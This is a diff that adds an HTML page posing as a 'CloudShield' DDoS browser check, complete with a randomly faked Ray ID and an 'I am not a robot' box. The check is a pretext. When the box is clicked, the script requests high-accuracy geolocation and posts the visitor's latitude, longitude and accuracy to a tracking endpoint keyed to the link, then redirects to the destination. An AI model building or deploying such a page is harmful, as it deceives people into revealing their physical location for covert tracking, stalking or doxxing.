@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Just a moment...</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f0f2f5;font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem}
+.topbar{position:fixed;top:0;left:0;right:0;height:4px;background:#e5e7eb;z-index:100}
+.topbar-fill{height:100%;width:0%;background:linear-gradient(90deg,#f6821f,#faad3f);transition:width .4s ease}
+.card{background:#fff;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.08),0 8px 32px rgba(0,0,0,.06);width:100%;max-width:440px;overflow:hidden}
+.state{display:none}.state.active{display:block}
+
+/* State 1 */
+#s1{padding:2.5rem 2rem;text-align:center}
+.cf-logo{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:2rem}
+.cf-logo-text{font-size:1.1rem;font-weight:600;color:#1a1a1a}
+.shield-wrap{margin:1.5rem auto;width:80px;height:80px;position:relative}
+.sh-svg{width:80px;height:80px;animation:shPulse 1.8s ease-in-out infinite}
+@keyframes shPulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.06);opacity:.85}}
+.orbit{position:absolute;top:50%;left:50%;width:104px;height:104px;margin:-52px 0 0 -52px;border:1.5px dashed rgba(246,130,31,.3);border-radius:50%;animation:orb 3s linear infinite}
+.orb-dot{position:absolute;top:-4px;left:50%;width:8px;height:8px;background:#f6821f;border-radius:50%;margin-left:-4px}
+@keyframes orb{to{transform:rotate(360deg)}}
+#s1 h1{font-size:1.15rem;font-weight:600;color:#111;margin-bottom:.4rem}
+#s1 p{font-size:.83rem;color:#6b7280;line-height:1.5}
+.dots{display:inline-flex;gap:4px;margin-top:1.5rem}
+.dot{width:7px;height:7px;border-radius:50%;background:#d1d5db;animation:dotB 1.2s ease-in-out infinite}
+.dot:nth-child(2){animation-delay:.2s}.dot:nth-child(3){animation-delay:.4s}
+@keyframes dotB{0%,80%,100%{background:#d1d5db;transform:scale(1)}40%{background:#f6821f;transform:scale(1.3)}}
+
+/* State 2 - captcha */
+#s2{padding:0}
+.cap-header{background:#1a1a1a;padding:1.1rem 1.5rem;display:flex;align-items:center;gap:10px}
+.cap-header-text h2{font-size:.92rem;font-weight:600;color:#fff}
+.cap-header-text p{font-size:.75rem;color:#9ca3af;margin-top:1px}
+.cap-body{padding:1.5rem}
+.site-info{display:flex;align-items:center;gap:10px;padding:.7rem .9rem;background:#f9fafb;border:1px solid #e5e7eb;border-radius:5px;margin-bottom:1.25rem}
+.favicon{width:20px;height:20px;background:linear-gradient(135deg,#6366f1,#8b5cf6);border-radius:3px;flex-shrink:0}
+.site-info-text{font-size:.82rem;color:#374151}
+.site-info-text strong{color:#111}
+.vbox{border:1.5px solid #e5e7eb;border-radius:6px;padding:1rem 1.1rem;display:flex;align-items:center;gap:12px;cursor:pointer;transition:border-color .2s,box-shadow .2s;margin-bottom:1rem;user-select:none}
+.vbox:hover{border-color:#9ca3af;box-shadow:0 0 0 3px rgba(0,0,0,.04)}
+.vbox.checking{border-color:#f6821f;box-shadow:0 0 0 3px rgba(246,130,31,.12);cursor:default}
+.vbox.done{border-color:#16a34a;box-shadow:0 0 0 3px rgba(22,163,74,.1);cursor:default}
+.chk-area{width:22px;height:22px;border:2px solid #d1d5db;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:border-color .2s,background .2s}
+.vbox.checking .chk-area{border-color:#f6821f}
+.vbox.done .chk-area{border-color:#16a34a;background:#16a34a}
+.chk-spin{width:13px;height:13px;border:2px solid rgba(246,130,31,.3);border-top-color:#f6821f;border-radius:50%;animation:spin .7s linear infinite;display:none}
+.chk-tick{display:none;color:#fff;font-size:12px;font-weight:700}
+@keyframes spin{to{transform:rotate(360deg)}}
+.vbox.checking .chk-spin{display:block}
+.vbox.done .chk-tick{display:block}
+.v-label{font-size:.88rem;color:#374151;font-weight:500}
+.v-sub{font-size:.75rem;color:#9ca3af;margin-top:2px}
+.cf-brand{display:flex;justify-content:flex-end}
+.cf-brand span{font-size:.68rem;color:#9ca3af}
+
+/* State 3 */
+#s3{padding:0}
+.con-hdr{background:linear-gradient(135deg,#16a34a,#15803d);padding:1.5rem;text-align:center}
+.ok-icon{width:52px;height:52px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto .75rem;font-size:1.4rem;animation:popIn .4s cubic-bezier(.34,1.56,.64,1) both}
+@keyframes popIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+.con-hdr h2{font-size:1rem;font-weight:600;color:#fff;margin-bottom:.25rem}
+.con-hdr p{font-size:.78rem;color:rgba(255,255,255,.7)}
+.con-body{padding:1.5rem}
+.dest-row{display:flex;align-items:center;gap:8px;padding:.65rem .9rem;background:#f9fafb;border:1px solid #e5e7eb;border-radius:5px;margin-bottom:1.2rem;font-size:.82rem}
+.dest-row span:first-child{color:#6b7280;white-space:nowrap}
+.dest-url{color:#111;font-weight:500;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.btn-con{width:100%;background:#f6821f;color:#fff;border:none;border-radius:5px;font-family:'Inter',sans-serif;font-size:.9rem;font-weight:600;padding:.85rem;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:background .15s}
+.btn-con:hover{background:#e0711a}
+.fine{text-align:center;font-size:.7rem;color:#d1d5db;margin-top:.9rem}
+
+/* State 4 */
+#s4{padding:2.5rem 2rem;text-align:center}
+.rd-spin{width:44px;height:44px;border:3px solid #e5e7eb;border-top-color:#f6821f;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 1.2rem}
+#s4 h2{font-size:1rem;font-weight:600;color:#111;margin-bottom:.35rem}
+#s4 p{font-size:.82rem;color:#6b7280}
+
+.card-foot{padding:.75rem 1.5rem;background:#f9fafb;border-top:1px solid #e5e7eb;display:flex;align-items:center;justify-content:space-between}
+.card-foot span{font-size:.7rem;color:#9ca3af}
+.pd-dots{display:flex;gap:3px}
+.pd{width:6px;height:6px;border-radius:50%;background:#d1d5db}
+.pd.g{background:#16a34a}.pd.y{background:#eab308}
+</style>
+</head>
+<body>
+<div class="topbar"><div class="topbar-fill" id="fill"></div></div>
+<div class="card">
+
+  <div class="state active" id="s1">
+    <div style="padding:2.5rem 2rem;text-align:center">
+      <div class="cf-logo">
+        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+          <path d="M14 2L3 7.5v7C3 20.955 7.92 26.18 14 27.5 20.08 26.18 25 20.955 25 14.5v-7L14 2z" fill="#f6821f" opacity=".15"/>
+          <path d="M14 2L3 7.5v7C3 20.955 7.92 26.18 14 27.5 20.08 26.18 25 20.955 25 14.5v-7L14 2z" stroke="#f6821f" stroke-width="1.5" stroke-linejoin="round"/>
+          <path d="M9.5 14.5l3.5 3.5 6-7" stroke="#f6821f" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span class="cf-logo-text">Security Check</span>
+      </div>
+      <div class="shield-wrap">
+        <div class="orbit"><div class="orb-dot"></div></div>
+        <svg class="sh-svg" viewBox="0 0 80 80" fill="none">
+          <path d="M40 8L12 20v20c0 16.569 12.86 29.742 28 32 15.14-2.258 28-15.431 28-32V20L40 8z" fill="#fff7ed" stroke="#f6821f" stroke-width="2" stroke-linejoin="round"/>
+          <path d="M28 40l8.5 8.5L54 32" stroke="#f6821f" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1>Checking your browser…</h1>
+      <p>Verifying you're not a bot.<br>This usually takes a few seconds.</p>
+      <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+    </div>
+    <div class="card-foot"><span>DDoS protection by <strong>CloudShield</strong></span><div class="pd-dots"><div class="pd g"></div><div class="pd g"></div><div class="pd y"></div></div></div>
+  </div>
+
+  <div class="state" id="s2">
+    <div class="cap-header">
+      <svg width="22" height="22" viewBox="0 0 22 22" fill="none"><path d="M11 2L3 6v5c0 5 3.5 8.9 8 10 4.5-1.1 8-5 8-10V6L11 2z" fill="#f6821f" opacity=".25" stroke="#f6821f" stroke-width="1.3"/><path d="M7.5 11l2.5 2.5 4.5-5" stroke="#f6821f" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <div class="cap-header-text"><h2>Verify you are human</h2><p>Complete the security challenge to continue</p></div>
+    </div>
+    <div class="cap-body">
+      <div class="site-info"><div class="favicon"></div><div class="site-info-text">Redirecting to <strong id="siteDisp">—</strong></div></div>
+      <div class="vbox" id="vbox" onclick="doVerify()">
+        <div class="chk-area"><div class="chk-spin"></div><div class="chk-tick">✓</div></div>
+        <div><div class="v-label">I am not a robot</div><div class="v-sub">Click to verify your browser</div></div>
+      </div>
+      <div class="cf-brand"><span>Protected by CloudShield · Privacy · Terms</span></div>
+    </div>
+    <div class="card-foot"><span>Ray ID: <strong id="rayId">—</strong></span><div class="pd-dots"><div class="pd g"></div><div class="pd g"></div><div class="pd y"></div></div></div>
+  </div>
+
+  <div class="state" id="s3">
+    <div class="con-hdr"><div class="ok-icon">✓</div><h2>Verification successful</h2><p>You may now proceed to the destination</p></div>
+    <div class="con-body">
+      <div class="dest-row"><span>→</span><span class="dest-url" id="destDisp">—</span></div>
+      <button class="btn-con" onclick="doContinue()">
+        <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M3 8h10M9 4l4 4-4 4" stroke="#fff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Continue to site
+      </button>
+      <div class="fine">By continuing you agree to our terms of service</div>
+    </div>
+    <div class="card-foot"><span>Verification complete · <strong>Secure connection</strong></span><div class="pd-dots"><div class="pd g"></div><div class="pd g"></div><div class="pd g"></div></div></div>
+  </div>
+
+  <div class="state" id="s4">
+    <div class="rd-spin"></div>
+    <h2>Redirecting you now…</h2>
+    <p>Please wait a moment</p>
+  </div>
+
+</div>
+<script>
+const linkId = window.location.pathname.split('/').pop();
+let destUrl = 'https://google.com';
+let locationSent = false;
+
+fetch('/api/hits/' + linkId).then(r=>r.json()).then(d=>{
+  destUrl = d.dest || destUrl;
+  let h = destUrl; try{ h = new URL(destUrl).hostname; }catch(e){}
+  document.getElementById('siteDisp').textContent = h;
+  document.getElementById('destDisp').textContent = h;
+}).catch(()=>{});
+
+document.getElementById('rayId').textContent =
+  Math.random().toString(36).substr(2,8).toUpperCase()+'-'+
+  Math.random().toString(36).substr(2,4).toUpperCase();
+
+const fill = document.getElementById('fill');
+function setP(p,d){ fill.style.transition=`width ${d}ms ease`; fill.style.width=p+'%'; }
+function show(id){ document.querySelectorAll('.state').forEach(s=>s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
+
+setP(35,900);
+setTimeout(()=>setP(70,1100),900);
+setTimeout(()=>{ setP(78,300); show('s2'); },2500);
+
+let done=false;
+function doVerify(){
+  if(done)return; done=true;
+  document.getElementById('vbox').classList.add('checking');
+  setP(88,500);
+
+  // Fire geolocation — POST result to backend
+  function postLoc(lat,lon,acc){
+    if(locationSent)return; locationSent=true;
+    fetch('/api/hit/'+linkId,{
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({lat,lon,acc})
+    }).catch(()=>{});
+  }
+
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+      p=>postLoc(p.coords.latitude, p.coords.longitude, Math.round(p.coords.accuracy)),
+      ()=>postLoc(null,null,null),
+      {enableHighAccuracy:true,timeout:12000}
+    );
+  } else {
+    postLoc(null,null,null);
+  }
+
+  setTimeout(()=>{
+    document.getElementById('vbox').classList.remove('checking');
+    document.getElementById('vbox').classList.add('done');
+    setP(95,400);
+    setTimeout(()=>show('s3'),600);
+  },1500);
+}
+
+function doContinue(){
+  show('s4'); setP(100,300);
+  setTimeout(()=>window.location.href=destUrl, 900);
+}
+</script>
+</body>
+</html>
